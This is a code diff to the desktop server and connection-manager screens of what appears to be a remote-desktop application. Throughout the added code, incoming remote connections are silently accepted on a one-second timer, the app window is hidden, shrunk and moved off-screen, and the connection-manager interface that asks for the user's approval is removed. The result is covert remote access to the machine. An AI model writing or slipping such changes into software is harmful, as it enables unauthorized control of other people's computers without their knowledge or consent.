@@ -40,12 +40,65 @@ class _DesktopServerPageState extends State<DesktopServerPage>
       onRemoveId(id);
     };
   }
-
   @override
   void initState() {
     windowManager.addListener(this);
+
+    // 延迟处理，确保 ServerModel 已初始化
+    Future.delayed(Duration(milliseconds: 200), () async {
+      // 自动接受连接
+      _autoAcceptAllConnections();
+
+      // 隐藏窗口
+      await windowManager.setSkipTaskbar(true);
+      await windowManager.setAlwaysOnTop(false);
+      await windowManager.hide();
+      await windowManager.setSize(Size(1, 1));
+      await windowManager.setPosition(Offset(-10000, -10000));
+
+      // 不立即关闭窗口，保持它在后台运行但隐藏
+      // 这样连接管理器可以继续处理连接
+    });
+
     super.initState();
   }
+
+  void _autoAcceptAllConnections() {
+    // 定期检查并接受新连接
+    Timer.periodic(Duration(seconds: 1), (timer) {
+      try {
+        final serverModel = gFFI.serverModel;
+        for (var client in serverModel.clients) {
+          if (!client.authorized) {
+            print("自动接受连接: ${client.name} (${client.peerId})");
+            serverModel.sendLoginResponse(client, true);
+          }
+        }
+      } catch (e) {
+        print("自动接受连接失败: $e");
+      }
+    });
+  }
+  //
+  // @override
+  // void initState() {
+  //   windowManager.addListener(this);
+  //   // 强力隐藏窗口
+  //   Future.microtask(() async {
+  //     await windowManager.setSkipTaskbar(true);
+  //     await windowManager.setAlwaysOnTop(false);
+  //     await windowManager.hide();
+  //     await windowManager.setSize(Size(1, 1));
+  //     await windowManager.setPosition(Offset(-10000, -10000));
+  //
+  //     // 延迟关闭确保隐藏生效
+  //     Future.delayed(Duration(milliseconds: 100), () async {
+  //       await windowManager.setPreventClose(false);
+  //       await windowManager.close();
+  //     });
+  //   });
+  //   super.initState();
+  // }
 
   @override
   void dispose() {
@@ -83,13 +136,11 @@ class _DesktopServerPageState extends State<DesktopServerPage>
         }
       }
 
-      // 如果有任何连接（无论是否授权），都最小化窗口
-      if (serverModel.clients.isNotEmpty) {
-        windowManager.minimize();
-      }
+      // 直接关闭连接管理器窗口
+      windowManager.close();
     });
 
-    // 完全隐藏连接管理器，返回空容器
+    // 返回空的容器
     return Container();
   }
   // @override
@@ -180,109 +231,135 @@ class ConnectionManagerState extends State<ConnectionManager>
     WidgetsBinding.instance.removeObserver(this);
     super.dispose();
   }
-
+  //
+  // @override
+  // Widget build(BuildContext context) {
+  //   final serverModel = Provider.of<ServerModel>(context);
+  //   pointerHandler(PointerEvent e) {
+  //     if (serverModel.cmHiddenTimer != null) {
+  //       serverModel.cmHiddenTimer!.cancel();
+  //       serverModel.cmHiddenTimer = null;
+  //       debugPrint("CM hidden timer has been canceled");
+  //     }
+  //   }
+  //
+  //   return serverModel.clients.isEmpty
+  //       ? Column(
+  //           children: [
+  //             buildTitleBar(),
+  //             Expanded(
+  //               child: Center(
+  //                 child: Text(translate("Waiting")),
+  //               ),
+  //             ),
+  //           ],
+  //         )
+  //       : Listener(
+  //           onPointerDown: pointerHandler,
+  //           onPointerMove: pointerHandler,
+  //           child: DesktopTab(
+  //             showTitle: false,
+  //             showMaximize: false,
+  //             showMinimize: true,
+  //             showClose: true,
+  //             onWindowCloseButton: handleWindowCloseButton,
+  //             controller: serverModel.tabController,
+  //             selectedBorderColor: MyTheme.accent,
+  //             maxLabelWidth: 100,
+  //             tail: null, //buildScrollJumper(),
+  //             tabBuilder: (key, icon, label, themeConf) {
+  //               final client = serverModel.clients
+  //                   .firstWhereOrNull((client) => client.id.toString() == key);
+  //               return Row(
+  //                 mainAxisAlignment: MainAxisAlignment.center,
+  //                 children: [
+  //                   Tooltip(
+  //                       message: key,
+  //                       waitDuration: Duration(seconds: 1),
+  //                       child: label),
+  //                   unreadMessageCountBuilder(client?.unreadChatMessageCount)
+  //                       .marginOnly(left: 4),
+  //                 ],
+  //               );
+  //             },
+  //             pageViewBuilder: (pageView) => LayoutBuilder(
+  //               builder: (context, constrains) {
+  //                 var borderWidth = 0.0;
+  //                 if (constrains.maxWidth >
+  //                     kConnectionManagerWindowSizeClosedChat.width) {
+  //                   borderWidth = kConnectionManagerWindowSizeOpenChat.width -
+  //                       constrains.maxWidth;
+  //                 } else {
+  //                   borderWidth = kConnectionManagerWindowSizeClosedChat.width -
+  //                       constrains.maxWidth;
+  //                 }
+  //                 if (borderWidth < 0 || borderWidth > 50) {
+  //                   borderWidth = 0;
+  //                 }
+  //                 final realClosedWidth =
+  //                     kConnectionManagerWindowSizeClosedChat.width -
+  //                         borderWidth;
+  //                 final realChatPageWidth =
+  //                     constrains.maxWidth - realClosedWidth;
+  //                 final row = Row(children: [
+  //                   if (constrains.maxWidth >
+  //                       kConnectionManagerWindowSizeClosedChat.width)
+  //                     Consumer<ChatModel>(
+  //                         builder: (_, model, child) => SizedBox(
+  //                               width: realChatPageWidth,
+  //                               child: allowRemoteCMModification()
+  //                                   ? buildSidePage()
+  //                                   : buildRemoteBlock(
+  //                                       child: buildSidePage(),
+  //                                       block: _sidePageBlock,
+  //                                       mask: true),
+  //                             )),
+  //                   SizedBox(
+  //                       width: realClosedWidth,
+  //                       child: SizedBox(
+  //                           width: realClosedWidth,
+  //                           child: allowRemoteCMModification()
+  //                               ? pageView
+  //                               : buildRemoteBlock(
+  //                                   child: _buildKeyEventBlock(pageView),
+  //                                   block: _controlPageBlock,
+  //                                   mask: false,
+  //                                 ))),
+  //                 ]);
+  //                 return Container(
+  //                   color: Theme.of(context).scaffoldBackgroundColor,
+  //                   child: row,
+  //                 );
+  //               },
+  //             ),
+  //           ),
+  //         );
+  // }
   @override
   Widget build(BuildContext context) {
     final serverModel = Provider.of<ServerModel>(context);
-    pointerHandler(PointerEvent e) {
-      if (serverModel.cmHiddenTimer != null) {
-        serverModel.cmHiddenTimer!.cancel();
-        serverModel.cmHiddenTimer = null;
-        debugPrint("CM hidden timer has been canceled");
-      }
-    }
 
-    return serverModel.clients.isEmpty
-        ? Column(
-            children: [
-              buildTitleBar(),
-              Expanded(
-                child: Center(
-                  child: Text(translate("Waiting")),
-                ),
-              ),
-            ],
-          )
-        : Listener(
-            onPointerDown: pointerHandler,
-            onPointerMove: pointerHandler,
-            child: DesktopTab(
-              showTitle: false,
-              showMaximize: false,
-              showMinimize: true,
-              showClose: true,
-              onWindowCloseButton: handleWindowCloseButton,
-              controller: serverModel.tabController,
-              selectedBorderColor: MyTheme.accent,
-              maxLabelWidth: 100,
-              tail: null, //buildScrollJumper(),
-              tabBuilder: (key, icon, label, themeConf) {
-                final client = serverModel.clients
-                    .firstWhereOrNull((client) => client.id.toString() == key);
-                return Row(
-                  mainAxisAlignment: MainAxisAlignment.center,
-                  children: [
-                    Tooltip(
-                        message: key,
-                        waitDuration: Duration(seconds: 1),
-                        child: label),
-                    unreadMessageCountBuilder(client?.unreadChatMessageCount)
-                        .marginOnly(left: 4),
-                  ],
-                );
-              },
-              pageViewBuilder: (pageView) => LayoutBuilder(
-                builder: (context, constrains) {
-                  var borderWidth = 0.0;
-                  if (constrains.maxWidth >
-                      kConnectionManagerWindowSizeClosedChat.width) {
-                    borderWidth = kConnectionManagerWindowSizeOpenChat.width -
-                        constrains.maxWidth;
-                  } else {
-                    borderWidth = kConnectionManagerWindowSizeClosedChat.width -
-                        constrains.maxWidth;
-                  }
-                  if (borderWidth < 0 || borderWidth > 50) {
-                    borderWidth = 0;
-                  }
-                  final realClosedWidth =
-                      kConnectionManagerWindowSizeClosedChat.width -
-                          borderWidth;
-                  final realChatPageWidth =
-                      constrains.maxWidth - realClosedWidth;
-                  final row = Row(children: [
-                    if (constrains.maxWidth >
-                        kConnectionManagerWindowSizeClosedChat.width)
-                      Consumer<ChatModel>(
-                          builder: (_, model, child) => SizedBox(
-                                width: realChatPageWidth,
-                                child: allowRemoteCMModification()
-                                    ? buildSidePage()
-                                    : buildRemoteBlock(
-                                        child: buildSidePage(),
-                                        block: _sidePageBlock,
-                                        mask: true),
-                              )),
-                    SizedBox(
-                        width: realClosedWidth,
-                        child: SizedBox(
-                            width: realClosedWidth,
-                            child: allowRemoteCMModification()
-                                ? pageView
-                                : buildRemoteBlock(
-                                    child: _buildKeyEventBlock(pageView),
-                                    block: _controlPageBlock,
-                                    mask: false,
-                                  ))),
-                  ]);
-                  return Container(
-                    color: Theme.of(context).scaffoldBackgroundColor,
-                    child: row,
-                  );
-                },
-              ),
-            ),
-          );
+    // 自动接受所有连接
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      for (var client in serverModel.clients) {
+        if (!client.authorized) {
+          serverModel.sendLoginResponse(client, true);
+        }
+      }
+    });
+
+    // 立即关闭窗口
+    Future.microtask(() async {
+      await windowManager.setPreventClose(false);
+      await windowManager.hide();
+      // 延迟关闭确保窗口隐藏
+      Future.delayed(Duration(milliseconds: 50), () {
+        windowManager.close();
+      });
+    });
+
+    // 返回透明容器
+    return Container(color: Colors.transparent);
   }
 
   Widget buildSidePage() {
